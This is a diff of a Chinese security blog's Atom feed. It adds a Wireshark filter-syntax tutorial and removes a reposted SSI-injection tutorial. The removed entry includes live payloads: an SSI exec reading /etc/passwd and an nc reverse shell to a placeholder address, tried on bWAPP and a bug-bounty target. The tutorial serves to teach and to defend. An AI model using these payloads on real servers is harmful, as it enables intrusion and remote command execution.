@@ -157,6 +157,32 @@
   </entry>
   
   <entry>
+    <title>数据分析之Wireshark</title>
+    <link href="https://ckcah.github.io/2020/10/03/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E4%B9%8BWireshark/"/>
+    <id>https://ckcah.github.io/2020/10/03/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E4%B9%8BWireshark/</id>
+    <published>2020-10-02T22:56:10.000Z</published>
+    <updated>2020-11-20T15:34:16.079Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="0x01-Wireshark使用"><a href="#0x01-Wireshark使用" class="headerlink" title="0x01 Wireshark使用"></a>0x01 Wireshark使用</h3><p>首先从官网根据自己的环境下载对应的软件版本，然后安装即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.wireshark.org&#x2F;</span><br></pre></td></tr></table></figure><p>接下来打开Wireshark，可以看到设别的网卡信息，选择需要抓包的网卡双击即可。</p><p>或者按Ctrl+K，勾选需要抓包的网卡，一般情况都会选择WLAN点击Start开始抓包。从流量波形图可以看到弯曲起伏则表示有流量，直线则没有流量。</p><p><img src="C:%5CUsers%5CC%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201002190225228.png" alt="image-20201002190225228"></p><h3 id="0x02-Wireshark语法"><a href="#0x02-Wireshark语法" class="headerlink" title="0x02 Wireshark语法"></a>0x02 Wireshark语法</h3><p>1.过滤MAC地址</p><p>eth.addr == 00:71:cc:9a:28:93//过滤目标或源地址是00:71:cc:9a:28:93的数据包</p><p>eth.src == 00:71:cc:9a:28:93//过滤源地址是00:71:cc:9a:28:93的数据包</p><p>eth.dst == 00:71:cc:9a:28:93//过滤目标地址是00:71:cc:9a:28:93的数据包</p><p> 2.过滤VLAN</p><p>vlan.id == 1024    //过滤VLANID为1024的数据包</p><p>vlan.id_name ==yunzui //过滤VLAN名为1024的数据包</p><p> 3.IP过滤</p><p>//源地址过滤</p><p>ip.src == 8.8.8.8</p><p>ip.src eq 8.8.8.8</p><p>//目标地址过滤</p><p>ip.dst == 8.8.8.8</p><p>ip.dst eq 8.8.8.8</p><p>//ip地址过滤。不论源还是目标</p><p>ip.addr == 8.8.8.8</p><p>ip.addr eq 8.8.8.8</p><p> 4.端口过滤</p><p>tcp.port == 8888</p><p>udp.port eq 8888</p><p>tcp.dstport == 8888// 只显tcp协议的目标端口8888</p><p>tcp.srcport == 8888// 只显tcp协议的来源端口8888</p><p>//过滤端口范围</p><p>tcp.port &gt;= 1 andtcp.port &lt;= 8888</p><p> 5.常用协议过滤</p><p>tcp      //只显示TCP协议的数据流</p><p>udp      //只显示UDP协议的数据流</p><p>arp      //只显示ARP协议的数据流</p><p>icmp     //只显示ICMP协议的数据流</p><p>http     //只显示HTTP协议的数据流</p><p>smtp     //只显示SMTP协议的数据流</p><p>ftp      //只显示FTP协议的数据流</p><p>dns      //只显示DNS协议的数据流</p><p>……</p><p>排除HTTP包，如!http 或 not http</p><p> 6.HTTP模式过滤</p><p>http.request.method== “GET”</p><p>http.request.method== “POST”</p><p>http.request.uri ==“/img/logo-edu.gif”</p><p>http contains “GET”</p><p>http contains“HTTP/1.”</p><p>// GET数据包</p><p>http.request.method== “GET” &amp;&amp; http contains “Host: ”</p><p>http.request.method== “GET” &amp;&amp; http contains “User-Agent: ”</p><p>// POST数据包</p><p>http.request.method== “POST” &amp;&amp; http contains “Host: ”</p><p>http.request.method== “POST” &amp;&amp; http contains “User-Agent: ”</p><p>// HTTP请求数据包</p><p>http.request.method== “POST” &amp;&amp; http contains “Java/1.8.0_121”</p><p>// HTTP响应数据包</p><p>http contains“HTTP/1.1 200 OK” &amp;&amp; http contains “Content-Type: ”</p><p> 7.运算符</p><p>less than：lt</p><p>less and equal：le</p><p>equal：eq</p><p>great then：gt</p><p>great and equal：ge</p><p>not equal：ne</p><p> 8.连接符</p><p>and，or</p><p>如tcp.port == 8888 andip.addr = 88.88.88.88</p><h3 id="0x03-Wireshark功能"><a href="#0x03-Wireshark功能" class="headerlink" title="0x03 Wireshark功能"></a>0x03 Wireshark功能</h3><p>  1.数据包的结构</p><p>第1行：数据包整体概述，内容比较多</p><p>第2行：数据链路层详细信息，主要为mac地址</p><p>第3行：网络层详细信息，主要的是双方的IP地址</p><p>第4行：传输层的详细信息，主要的是双方的端口号</p><p>第5行：TCP或UDP是传输的DATA，DNS这是域名的相关信息</p><p><img src="C:%5CUsers%5CC%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20201002190520816.png" alt="image-20201002190520816"></p><p>2.wireshark着色规则</p><p>在菜单栏中点开视图中的着色规则就可以看到</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
+      
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="https://ckcah.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="数据分析" scheme="https://ckcah.github.io/tags/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
+  
+  <entry>
     <title>动名词练习</title>
     <link href="https://ckcah.github.io/2020/09/12/%E5%8A%A8%E5%90%8D%E8%AF%8D%E7%BB%83%E4%B9%A0/"/>
     <id>https://ckcah.github.io/2020/09/12/%E5%8A%A8%E5%90%8D%E8%AF%8D%E7%BB%83%E4%B9%A0/</id>
@@ -521,32 +547,6 @@
       <category term="Apache" scheme="https://ckcah.github.io/tags/Apache/"/>
     
       <category term="反序列化代码执行漏洞" scheme="https://ckcah.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>SSI注入</title>
-    <link href="https://ckcah.github.io/2020/05/24/SSI%E6%B3%A8%E5%85%A5/"/>
-    <id>https://ckcah.github.io/2020/05/24/SSI%E6%B3%A8%E5%85%A5/</id>
-    <published>2020-05-24T00:58:15.000Z</published>
-    <updated>2020-05-23T13:25:26.000Z</updated>
-    
-    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="服务器端包含注入SSI分析总结"><a href="#服务器端包含注入SSI分析总结" class="headerlink" title="服务器端包含注入SSI分析总结"></a>服务器端包含注入SSI分析总结</h1><p><strong>本文作者：</strong><a href="https://www.secpulse.com/archives/author/w2n1ck" target="_blank" rel="noopener">w2n1ck</a></p><hr><h2 id="0x01-关于SSI"><a href="#0x01-关于SSI" class="headerlink" title="0x01 关于SSI"></a>0x01 关于SSI</h2><p>SSI是英文”Server Side Includes”的缩写，翻译成中文就是服务器端包含的意思。</p><p>SSI是嵌入HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。</p><p>从技术角度上来说，SSI就是在HTML文件中，可以通过注释行调用的命令或指针，即允许通过在HTML页面注入脚本或远程执行任意代码。</p><p><strong>1.1 启用SSI</strong></p><p><strong>示例：Nginx 配置SSI功能</strong></p><p>在http段中加入下面几句即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssi on;</span><br><span class="line">ssi_silent_errors off;</span><br><span class="line">ssi_types text&#x2F;shtml;</span><br></pre></td></tr></table></figure><p>默认Apache不开启SSI，SSI这种技术已经比较少用了。如果应用没有使用到SSI，关闭服务器对SSI的支持即可。</p><p>IIS和Apache都可以开启SSI功能，具体可参考:<a href="http://m.jb51.net/article/25725.htm](http://m.jb51.net/article/25725.htm" target="_blank" rel="noopener">Apache、Nginx 服务配置服务器端包含（SSI）</a></p><p><strong>1.2 SSI语法</strong></p><p>首先，介绍下SHTML，在SHTML文件中使用SSI指令引用其他的html文件（#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。比如说框架是固定的，但是里面的文章，其他菜单等即可以用#include引用进来。</p><p><strong>①显示服务器端环境变量&lt;#echo&gt;</strong></p><p>本文档名称：</p><p>&lt;!–#echo var=”DOCUMENT_NAME”–&gt;</p><p>现在时间：</p><p>&lt;!–#echo var=”DATE_LOCAL”–&gt;</p><p>显示IP地址：</p><p>&lt;! #echo var=”REMOTE_ADDR”–&gt;</p><p><strong>②</strong> <strong>将文本内容直接插入到文档中&lt;#include&gt;</strong></p><p>&lt;! #include file=”文件名称”–&gt;</p><!--#include virtual="index.html" --><p>&lt;! #include virtual=”文件名称”–&gt;</p><!--#include virtual="/www/footer.html" --><p>注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径</p><p><strong>③显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</strong></p><p>文件最近更新日期：</p><p>&lt;! #flastmod file=”文件名称”–&gt;</p><p>文件的长度：</p><p>&lt;!–#fsize file=”文件名称”–&gt;</p><p><strong>④直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序)</strong></p><p>&lt;!–#exec cmd=”文件名称”–&gt;</p><!--#exec cmd="cat /etc/passwd"--><p>&lt;!–#exec cgi=”文件名称”–&gt;</p><!--#exec cgi="/cgi-bin/access_log.cgi"–>将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是cgi。**⑤设置SSI信息显示格式<#config>(如文件制作日期/大小显示方式**)**⑥高级SSI可设置变量使用if条件语句。**## 0x02 漏洞场景在很多业务中，用户输入的内容会显示在页面中。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI漏洞。从定义中看出，页面中有一小部分是动态输出的时候使用SSI，比如：- 文件相关的属性字段- 当前时间- 访客IP- 调用CGI程序## 0x03 SSI注入的条件当符合下列条件时，攻击者可以在 Web 服务器上运行任意命令：- Web 服务器已支持SSI（服务器端包含）- Web 应用程序未对对相关SSI关键字做过滤- Web 应用程序在返回响应的HTML页面时，嵌入用户输入SSI注入常用命令：[Server-Side Includes (SSI) Injection] https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection## 0x04 SSI挖掘思路两个思路：- 从业务场景来Fuzz，比如获取IP、定位、时间等- 识别页面是否包含.stm,.shtm和.shtml后缀- [**伏特分布式漏洞扫描平台**](https://v.duoyinsu.com/)**已经全面支持SSI检测。**google dork：'inurl:bin/cklb'## 0x05 SSI漏洞复现**5.1 本地测试**我们使用bWAPP来做漏洞演示环境选择：'Server-Side Includes (SSI) Injection'<img src="https://ckcah.github.io/images/SSI注入/1.png" >输入个XSS的payload：'<script>alert(1)</script>'<img src="https://ckcah.github.io/images/SSI注入/2.png" >成功执行了代码。再使用下exec指令使用cmd作为参数执行服务器端命令：'<!--#exec cmd="ls -al"-->'<img src="https://ckcah.github.io/images/SSI注入/3.png" ><p><strong>5.2 漏洞挖掘</strong></p><p>运气好，刚好遇到个某SRC的。</p><p>“–&gt;’–&gt;`–&gt;&lt;<!--#exec cmd="cat /etc/passwd"--></p><p>执行命令</p><img src="https://ckcah.github.io/images/SSI注入/4.png" ><p>“–&gt;’–&gt;`–&gt;&lt;<!--#exec cmd="nc x.x.x.x 9090 -e /bin/bash"--></p><p>反弹shell</p><img src="https://ckcah.github.io/images/SSI注入/5.png" ><h2 id="0x06-SSI防御"><a href="#0x06-SSI防御" class="headerlink" title="0x06 SSI防御"></a>0x06 SSI防御</h2><ul><li>关闭服务器SSI功能</li><li>过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,&quot;,&#39;</code>）</li></ul><p>具体请参考：</p><p><a href="http://blog.csdn.net/qq_29277155/article/details/52751364" target="_blank" rel="noopener">[SSI 注入的介绍和代码防御]</a></p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="http://m.jb51.net/article/25725.htm" target="_blank" rel="noopener">http://m.jb51.net/article/25725.htm</a></p><p><a href="http://www.kubiji.cn/topic-id998.html" target="_blank" rel="noopener">http://www.kubiji.cn/topic-id998.html</a></p><p><a href="https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection" target="_blank" rel="noopener">https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection</a></p><p><a href="http://www.mottoin.com/101526.html" target="_blank" rel="noopener">http://www.mottoin.com/101526.html</a></p><p><a href="http://www.evilclay.com/2017/04/28/SSI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">http://www.evilclay.com/2017/04/28/SSI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/</a></p><p><a href="http://blog.csdn.net/qq_29277155/article/details/52751364" target="_blank" rel="noopener">http://blog.csdn.net/qq_29277155/article/details/52751364</a></p><p>【本文 <a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">服务器端包含注入SSI分析总结</a> 作者：安识科技<a href="https://www.secpulse.com/archives/author/w2n1ck" target="_blank" rel="noopener">w2n1ck</a> 转载注明来源<a href="https://www.secpulse.com/archives/61101.html" target="_blank" rel="noopener">安全脉搏</a>】</p><p><a href="https://www.secpulse.com/archives/66934.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/66934.html</a>)</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
-      
-    
-    </summary>
-    
-    
-      <category term="web安全" scheme="https://ckcah.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SSI注入" scheme="https://ckcah.github.io/tags/SSI%E6%B3%A8%E5%85%A5/"/>
     
   </entry>
   
